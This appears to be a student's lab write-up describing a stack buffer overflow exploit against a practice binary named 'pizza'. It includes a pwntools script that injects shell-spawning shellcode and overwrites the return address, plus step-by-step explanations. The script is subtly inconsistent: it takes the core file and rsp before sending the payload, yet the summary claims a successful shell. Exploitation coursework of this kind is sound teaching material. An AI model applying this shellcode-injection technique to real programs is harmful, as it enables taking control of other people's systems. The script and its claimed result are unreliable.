# Summary

This week's assignment requires us to create a python script that exploits our victim program 'pizza' by gaining access to the programs memory stack. The exploit will leak the stack offset of the program. Determine the offset of the return address on the stack, inject shellcode into the victim program, and overwrite the return address with the address of the shellcode, allowing for the successful spawn of a shell. To achieve this, the following steps must be completed:

1. Analyze the Victim Program: To start, we analyze the 'pizza' program to understand its behavior and determine any potential vulnerabilities. By examining the program's source code in ghidra, and by testing the program upon execution, we discovered a buffer overflow vulnerability. 
2. Find the Stack Offset: By sending overloaded strings of input into the program's getname function, we are able to get the program to crash and create a core dump file. This step is important in gathering information about the offset and where the return address is stored on the stack.
3. Print the Stack with Indicators: Next, using pwntools we are able to use the core file to gather information about the stack and print the stack with an indicator that shows us where the rsp is located 
4. Payload: Now that we have gathered the location of the offset and the determined where the program's return address is located in memory we can craft a payload that will overflow the buffer and overwrite the return address with the shellcode.
5. Executing the shellcode: Upon execution of the payload the program redirected control flow to our shellcode instead of the original return address. As a result, the shellcode was executed and spawned a shell providing us with interactive access to the victim's program enviorment.


# Python Code:

```
from pwn import *

context.log_level = 'error'

# Executable and Linkable Format
elf = ELF("./pizza")

context(arch='amd64', os='linux', endian='little', word_size=64)

# Shellcode
shellcode = asm(shellcraft.amd64.linux.sh())

# Shellcode Information
print(f"Shellcode: {shellcode.hex().upper()}")
print(len(shellcode))


# Print the stack with indicator at rsp
def print_stack(core):
    rsp = core.rsp
    range_size = 128
    start = rsp + range_size
    end = rsp - range_size

    print("Stack contents:")
    for addr in range(start, end, -8):
        if addr == rsp:
            print(f"{hex(addr)} <--- rsp")
        else:
            print(hex(addr))

# Start the Victim Process
victim = process("./pizza")
print(str(victim.recvline(), "latin-1"))


# victim.recvline()
#victim.sendline(b"10")

# Overflow the Buffer
overflow_input = b'A' * 248  # Adjusted length new return address

core = victim.corefile

# Calculate the address
rsp_address = core.rsp

# Convert rsp_address to bytes
rsp_address_bytes = p64(rsp_address)

# Payload
payload = overflow_input + rsp_address_bytes + shellcode

# Print payload information
print("Payload:", payload)
print("Payload length:", len(payload))

victim.sendline(payload)

# Wait for the program to crash
victim.wait()

# Call the function to print the stack with indicator at rsp
print_stack(core)

# Disassemble the instruction at the address stored in rip
instruction_bytes = core.read(core.rip, 8)
instruction_disassembly = disasm(instruction_bytes, arch='amd64')
print("Disassembled instruction:", instruction_disassembly)

# Print the memory content at the stack pointer
print("Memory content at rsp:", hex(core.rsp))
rsp_content = core.read(core.rsp, 100)
print(rsp_content)

# Interactive Shell
victim.interactive()

# Close the target program
victim.close()
```

# Code Explanation:

- We start by importing the necessary pwntools libraries. pwn provides functions for interacting with binary programs. We also set the log level to 'error' to suppress unnecessary output.

- The 'ELF' class is used to load information about the victim program from its executable file

- The shellcode is generated using the 'asm' function and the 'shellcraft' module. This is designed to spawn a shell when executed properly.

- We then print the shellcode information as a hexadecimal string and its length.

- The stack print function 'print_stack' is used to print the contents of the stack, with an indicator that points at the stack pointer (rsp).

- The victim program 'pizza' is started as a new process, and the first output function 'getname' from the program is received.

- The program then constructs the payload to exploit the buffer overflow vulnerability. It consists of padding bytes, the address of rsp, and the shellcode.

- Then the payload information is printed along with its length.

- The payload is sent to the victim program to trigger the buffer overflow.

- The code then waits for the program to crash.

- The print_stack function is called to print the contents of the stack along with the indicator at the rsp.

- The instruction at the address stored in the rip is dissembled and printed

- The memory contents at the stack pointer rsp are printed

- The victim program is now overtaken with the spawned shell and the interactive session is called.

- The victim program is closed.
